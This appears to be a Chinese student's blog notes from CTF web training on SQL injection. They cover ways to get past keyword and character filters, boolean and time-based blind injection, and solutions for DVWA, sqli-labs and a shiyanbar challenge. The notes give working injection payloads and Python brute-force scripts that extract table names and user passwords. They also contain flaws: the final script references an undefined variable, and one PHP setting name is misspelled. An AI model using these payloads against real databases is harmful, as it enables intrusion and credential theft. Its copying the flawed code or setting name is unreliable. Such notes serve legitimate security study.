---
title: WEB入门（二）
date: 2018-07-04 13:50:22
tags: [ctf, web]
---

今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。

<!-- more -->

# 带过滤的 SQL 注入

SQL 注入的过程中有些特定的字符或者字符串会被过滤，数据库无法了解正确的查询语句。

# 如何绕过过滤

## 运用编码技术绕过

1. ASCII 码

`CHAR(101, 97, 115, 116)` 即等价于 `east`

2. URL 编码

`0x61646D696E` 即等价于 `admin`

## 重复

例如：

```
seleselectct
admadminin
```

## 大小写交替

例如：

```
SeLEct
UnIOn
```

## 空格的绕过

- 用两个空格或者 TAB 代替
- `%a0` 代替
- `/**/` 代替
- 用括号 `()` 代替
- 用 `+` 代替
- 用花括号 `{}` 代替
- 用单引号或双引号代替

## 关键表名过滤绕过

`information_schema(这里空格).(这里空格)tables`

## 过滤等号

用 like 可以替代

## 过滤引号

`0x7573657273` 即等于 `"users"`

## 过滤大于小于号

函数 `greatest()` 和 `least()` 分别替代 `>` 和 `<`

例如：

```sql
select * from users where id=1 and ascii(substr(database(),1,1))>64
```

等价于

```sql
select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64
```

## 过滤逗号

`substr(str,1,1)`等价于`substr(str from 1 for 1)`

## SLEEP 函数中不能用数字

用 `pi()` 和 `ceil()` 过滤

```sql
sleep(ceil(pi()))
```

## 过滤注释符（`#`、`--+`）

用闭合的方式：

```sql
1' and '1
```

## 宽字节注入

在 MYSQL 中是用 GBK 编码时，会认为两个字符为一个汉字。宽字节注入即通过增加一个字符来过滤掉转义字符前的反斜杠

比如“\'”的 urlencode 编码为%5c%27，在前面加上%df，会使得%df%5c 构成一个汉字，%27 则作为一个单独的单引号

## `order by` 被过滤

使用 into 变量来绕过：

```sql
select * from users limit 1,1 into @a,@b,@c
```

在本地一张有六个字段的表中测试：

![](/pics/WEB集训/二/1.png)

![](/pics/WEB集训/二/2.png)

## 利用等价函数

- `hex()`、`bin()` ==> `ascii()`
- `sleep()` ==> `benchmark()`
- `concat_ws()` ==> `group_concat()`
- `mid()`、`substr()` ==> `substring()`
- `@@user` ==> `user()`
- `@@datadir` ==> `datadir()`

## MYSQL 条件注释利用

```sql
/*!..*/
```

以上语句在其他数据库中不执行，但在 MYSQL 中执行

```sql
/*!50000...*/
```

以上语句在 50000 版本以上不执行，否则必执行，用于过滤正则表达式

# 盲注

铁盆对 SQL 回显注入的解释：

```
我问你叫什么名字，你回答你叫奥特曼。
```

而 SQL 盲注是相反的，即不直接显示搜索到的结果，而从其他方式来推断得出结果的 SQL 注入

SQL 盲注常用函数：

- if 和 case when：用于时间盲注
- substring、substr、mid 等：用于截断字符串
- ascii：使字符变成 ASCII 码
- limit offset：用于猜取内容

## 布尔盲注

即只有 TRUE 和 FALSE 两种状态，过程中需要猜测，直到正确为止

铁盆箴言：

```
我问你叫什么名字，你只会说是和不是(ture false)。
于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。
但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。
```

1. 判断是否有盲注点

```sql
1' and 1=1 # 返回TRUE
1' and 1=2 # 返回FALSE，并且没有返回
```

即 SQL 语句执行成功和失败的返回界面存在某种固定的差异

2. 猜解库名、表名、列名、内容

```sql
1' and substr(database(),1,1)='a' # 猜解库名
1' and substr((select group_concat(table_name) from information_schema.tables where table_schema='DatabaseName'),1,1)='a' # 猜解表名
1' and substr((select group_concat(column_name) from information_schema.columns where table_name='TableName'),1,1)='a' # 猜解列名
1' and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)='a' # 猜解表名
```

以上即为基本的猜解过程

## 时间盲注

即对一个命令只有一个固定的反应，如果是正确的就会等待一定的时间再反应，如果错误立即反应

铁盆箴言：

```
我问你叫什么名字，无论对错，你只会 啊 的叫一声。
于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。
```

1. 判断是否有盲注点

```sql
1' and if(1=1,sleep(5),1) # 延迟返回为TRUE
1' and if(1=2,sleep(5),1) # 不延迟返回为FALSE
```

基本与布尔盲注类似。

2. 猜解库名、表名、列名、内容

```sql
1' and if((substr(database(),1,1)='a'),sleep(5),1) # 猜解库名
1' and if((substr((select group_concat(table_name) from information_schema.tables where table_schema='DatabaseName'),1,1)='a'),sleep(5),1) # 猜解表名
1' and if((substr((select group_concat(column_name) from information_schema.columns where table_name='TableName'),1,1)='a'),sleep(5),1) # 猜解列名
1' and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)='a'),sleep(5),1) # 猜解表名
```

以上即为基本的猜解过程。

# DVWA 之 SQL Injection

上课没有认真听，DVWA 安全级别一直开在 high，试了好久都做不出。下面就记录一下解题过程。

## 判断注入类型

![](/pics/WEB集训/二/3.png)

![](/pics/WEB集训/二/4.png)

## 判断字段数

![](/pics/WEB集训/二/5.png)

![](/pics/WEB集训/二/6.png)

## 猜解库名、表名、列名

![](/pics/WEB集训/二/7.png)

![](/pics/WEB集训/二/8.png)

![](/pics/WEB集训/二/9.png)

## 获取密码

![](/pics/WEB集训/二/10.png)

## 题目源码

```php
<?php

if(isset($_GET['Submit'])){

    // Retrieve data

    $id = $_GET['id'];

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last = mysql_result($result,$i,"last_name");

        echo '<pre>';
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>';

        $i++;
    }
}
?>
```

# SQL-LABS-MASTER

这里有个很大的坑。因为自己是在虚拟机上跑的 PHPSTUDY，想用脚本跑盲注的时候觉得有点麻烦，就直接用女朋友的电脑了。但是在女朋友的电脑上发现开不了 APACHE，只能用 NGINX，然后就发现各种脚本跑不出，手注也不行，但是在别人的电脑上明明能跑啊。

还好有牛逼的啦啦大哥哥帮忙才发现了漏洞。

在 PHP 的配置文件 php-ini 中发现参数 `agc_quotes_gpc` 是 on 的，即会对注入时的单引号进行转义，原本的注入点就很难被注入。修改成 off 之后即可

![](/pics/WEB集训/二/11.png)

## less-5

根据测试可以判断这里为布尔盲注

![](/pics/WEB集训/二/12.png)

![](/pics/WEB集训/二/13.png)

脚本如下：

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/less-5/index.php?id="
payload = "abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&();"

def get_databse():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and substr(database(),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Database: ", res)

def get_tables():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Table names: ", res)

def get_columns():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Column names: ", res)

def get_flag():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and substr((select group_concat(password separator ';') from security.users),{},1)='{}'%23".format(i, ch)
            r = requests.get(url + sql)
            if(len(r.text) == 704):
                res += ch
                print(res)
                break
    print("Flag: ", res)

if __name__ == '__main__':
    # get_databse() # 库名：security
    # get_tables() # 表名：emails;referers;uagents;users
    # get_columns() # 列名：1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password
    # 根据以上的结果可以认为需要找的东西在users表中的password字段
    get_flag() # dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4
```

最后看一看网页源码，其实实现还是很简单的

![](/pics/WEB集训/二/14.png)

## less-9

根据测试判断为时间盲注

![](/pics/WEB集训/二/15.png)

脚本如下：

```python
import requests

url = "http://127.0.0.1/sqli-labs-master/less-9/index.php?id="
payload = "abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&();"

def get_databse():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and if((substr(database(),{},1)='{}'),sleep(4),1)%23".format(i, ch)
            try:
                r = requests.get(url + sql, timeout=3.9)
            except requests.exceptions.ReadTimeout:
                res += ch
                print(res)
                break
    print("Database: ", res)

def get_tables():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and if((substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),{},1)='{}'),sleep(4),1)%23".format(i, ch)
            try:
                r = requests.get(url + sql, timeout=3.9)
            except requests.exceptions.ReadTimeout:
                res += ch
                print(res)
                break
    print("Table names: ", res)

def get_columns():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and if((substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='uagents' and table_schema=database()),{},1)='{}'),sleep(4),1)%23".format(i, ch)
            try:
                r = requests.get(url + sql, timeout=3.9)
            except requests.exceptions.ReadTimeout:
                res += ch
                print(res)
                break
    print("Column names: ", res)

def get_flag():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "1' and if((substr((select group_concat(password separator ';') from security.users),{},1)='{}'),sleep(4),1)%23".format(i, ch)
            try:
                r = requests.get(url + sql, timeout=3.9)
            except requests.exceptions.ReadTimeout:
                res += ch
                print(res)
                break
    print("Flag: ", res)

if __name__ == '__main__':
    # get_databse() # 库名：security
    # get_tables() # 列名：emails;referers;uagents;users
    # get_columns() # 表名：1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord)
    # 由于时间盲注会受到网络的影响，需要多试几次来提高结果的精确度
    # 根据以上的结果可以认为需要找的东西在users表中的password字段
    get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4
```

源码如下：

![](/pics/WEB集训/二/16.png)

## less-25

就是过滤了 AND 和 OR，其他的话和 DVWA 的 LOW LEVEL SQL INJECTION 是一样的

![](/pics/WEB集训/二/17.png)

这里 information_schema 库名中也有 or，要记得双写

![](/pics/WEB集训/二/18.png)

![](/pics/WEB集训/二/19.png)

![](/pics/WEB集训/二/20.png)

password 中的 or 也会被过滤

![](/pics/WEB集训/二/21.png)

![](/pics/WEB集训/二/22.png)

## less-26

已经能猜到表中有三个字段，所以就不测字段，然后用%A0 替代空格，用%26%26(&&)替代 AND，写出 payload：

```mysql
0%27%A0union%A0select%A01,database(),3%26%26%271
```

因为注释符都被过滤了，所以语句最后通过加上“and '1”来绕过

![](/pics/WEB集训/二/23.png)

网页源码是这样的，过滤了好多东西：

![](/pics/WEB集训/二/24.png)

## less-27

用大小写交替来绕过过滤，其他过滤和上一题相同，于是直接写出 payload：

```mysql
0%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271
```

![](/pics/WEB集训/二/25.png)

网页源码：

![](/pics/WEB集训/二/26.png)

# 实验吧简单的 sql 注入

## 简单的 sql 注入

通过注入获得 flag 值（提交格式：flag{}）。
[解题链接](http://ctf5.shiyanbar.com/423/web/)

这里过滤了很多关键字，需要尝试多次以后才能构造出正确的 payload。以下为每一步的 payload。

获取库名：

```sql
' unionunion  selectselect  database() '
```

![](/pics/WEB集训/二/27.png)

获取表名：

```sql
'  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_table_schemaschema='web1
```

![](/pics/WEB集训/二/28.png)

获取列名：

```sql
' unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_table_schemaschema='web1' andand  table_name='flag
```

![](/pics/WEB集训/二/29.png)

得到 flag：

```sql
' unionunion  selectselect  flag  fromfrom  web1.flag wherewhere  '1'='1
```

![](/pics/WEB集训/二/30.png)

# 简单的 sql 注入 3

mysql 报错注入
格式：flag{}
[解题链接](http://ctf5.shiyanbar.com/web/index_3.php)

依次输入 `1 and 1=1` 和 `1 and 1=2`，发现存在布尔盲注。

![](/pics/WEB集训/二/31.png)

![](/pics/WEB集训/二/32.png)

经过上一题直接猜测表名为 `flag`（如果和上一题一样就可以直接写爆破 flag 的脚本了），返回 hello，说明确实有 `flag` 这个表。那么就可以直接写脚本爆破了。

![](/pics/WEB集训/二/33.png)

直接爆破 flag 表 flag 字段得到 flag。脚本如下：

```python
import requests, re
payload = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}_!@#$^&*().-"
url = "http://ctf5.shiyanbar.com/web/index_3.php"

def get_flag():
    res = ""
    for i in range(1, 100):
        print(i)
        for ch in payload:
            sql = "?id=1' and (select flag from flag) like '{}{}%'%23".format(name, ch)
            r = requests.get(url + sql)
            if r.text.find('Hello!') != -1:
                res += ch
                print(res)
                break
    print("flag: " + res)

if __name__ == '__main__':
    get_flag()
```

# 参考网站

https://www.2cto.com/database/201607/529000.html
